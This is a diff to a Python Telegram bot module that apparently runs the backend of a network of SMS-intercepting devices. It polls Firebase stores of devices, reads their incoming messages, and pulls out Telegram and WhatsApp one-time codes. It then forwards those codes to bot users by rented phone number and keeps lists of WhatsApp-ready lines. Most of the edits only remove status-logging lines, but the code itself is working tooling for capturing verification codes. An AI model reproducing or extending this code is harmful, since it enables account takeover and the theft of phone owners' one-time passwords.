@@ -16,7 +16,6 @@ log = logging.getLogger("Scanner")
 
 
 def _push_otp_to_account(phone_number, service, otp, rent_id, raw_text):
-    """Telegram account ke OTP history mein push karo (max 20)."""
     if not phone_number or phone_number == "Unknown":
         return
     clean = ''.join(filter(str.isdigit, str(phone_number)))[-10:]
@@ -24,7 +23,6 @@ def _push_otp_to_account(phone_number, service, otp, rent_id, raw_text):
         return
     d = db.load_data()
     accounts = d.setdefault("telegram_accounts", {})
-    # Match by last 10 digits
     matched_key = None
     for key in accounts.keys():
         key_clean = ''.join(filter(str.isdigit, str(key)))[-10:]
@@ -69,7 +67,6 @@ async def send_otp_to_user(bot, uid, service, otp, msg_text, rent_id, phone_numb
         user["otp_history"] = hist[:20]
         db.save_data(d)
 
-    # 🚨 NEW: Telegram accounts ke OTP history mein bhi push karo
     try:
         _push_otp_to_account(phone_number, service, otp, rent_id, msg_text)
     except Exception as e:
@@ -82,7 +79,6 @@ async def send_otp_to_user(bot, uid, service, otp, msg_text, rent_id, phone_numb
 
 
 async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_number, service_filter):
-    db.set_bot_status("Fast Scanner", f"Checking messages for {dev_id[:8]}...")
     url = f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5"
     msgs = await fbu.fetch_fb(url, auth)
     if not msgs:
@@ -108,7 +104,9 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
                     if "telegram" not in text_lower:
                         continue
                     detected_service = "Telegram"
-                db.set_bot_status("Fast Scanner", f"🚨 OTP Found! {detected_service} for {phone_number}")
+                
+                # 🚨 FIX: set_bot_status se push_activity kiya
+                db.push_activity("OTP Found", f"{detected_service} OTP for {phone_number}")
                 for uid in users:
                     await send_otp_to_user(bot, uid, detected_service, otp, text, dev_id, phone_number)
         if current_id > highest_id:
@@ -149,11 +147,8 @@ async def start_scanner(bot):
                                 updated = True
                 if updated:
                     db.save_data(d)
-            else:
-                db.set_bot_status("Fast Scanner", "Idle (No active leases)")
             await asyncio.sleep(1.0)
         except Exception as e:
-            db.set_bot_status("Fast Scanner", f"Error: {str(e)[:30]}")
             log.error(f"Scanner error: {e}")
             await asyncio.sleep(1.0)
 
@@ -169,7 +164,6 @@ async def whatsapp_scanner(bot):
             for i in range(0, len(fbs), 5):
                 chunk = fbs[i:i+5]
                 for fb in chunk:
-                    db.set_bot_status("WA Scanner", f"Fetching clients from base...")
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                     if not clients or not isinstance(clients, dict):
                         continue
@@ -178,7 +172,6 @@ async def whatsapp_scanner(bot):
                             continue
                         is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000)
                         if is_online:
-                            db.set_bot_status("WA Scanner", f"Checking {dev_id[:8]} for WhatsApp codes...")
                             msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                             if not msgs_dict:
                                 continue
@@ -204,13 +197,10 @@ async def whatsapp_scanner(bot):
                                         "battery": real_battery,
                                         "time": int(now), "sort_id": latest_id
                                     }
-            db.set_bot_status("WA Scanner", f"✅ Saved {len(ready_lines)} WA lines in DB. Sleeping 60s...")
             d = db.load_data()
             d["whatsapp_ready_lines"] = ready_lines
             db.save_data(d)
-            log.info(f"Updated {len(ready_lines)} WhatsApp ready lines in DB.")
         except Exception as e:
-            db.set_bot_status("WA Scanner", f"Error: {str(e)[:30]}")
             log.error(f"WA Scanner error: {e}")
         await asyncio.sleep(60)
 
@@ -223,7 +213,6 @@ async def backup_scanner(bot):
             fbs = d.get("firebases", [])
             if fbs:
                 all_devs = []
-                db.set_bot_status("Backup Scanner", "Fetching all devices...")
                 for fb in fbs:
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
                     if clients and isinstance(clients, dict):
@@ -237,7 +226,6 @@ async def backup_scanner(bot):
                         missing.append((fb, dev_id))
                 random.shuffle(missing)
                 for fb, dev_id in missing[:10]:
-                    db.set_bot_status("Backup Scanner", f"Extracting number for {dev_id[:8]}...")
                     msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                     dev_data = await fbu.fetch_fb(f"{fb['url']}/clients/{dev_id}.json", fb.get("auth"))
                     if msgs and isinstance(msgs, dict) and dev_data and isinstance(dev_data, dict):
@@ -253,7 +241,6 @@ async def backup_scanner(bot):
                         if now - d["device_backups"][dev_id].get("time", 0) > 172800:
                             del d["device_backups"][dev_id]
                 db.save_data(d)
-                db.set_bot_status("Backup Scanner", "Backup loop done. Sleeping 10s...")
             timers = d.get("upcoming_timers", {})
             now = int(time.time())
             changed = False
@@ -283,6 +270,5 @@ async def backup_scanner(bot):
                 db.save_data(d)
             await asyncio.sleep(10)
         except Exception as e:
-            db.set_bot_status("Backup Scanner", f"Error: {str(e)[:30]}")
             log.error(f"Backup Scanner error: {e}")
             await asyncio.sleep(10)
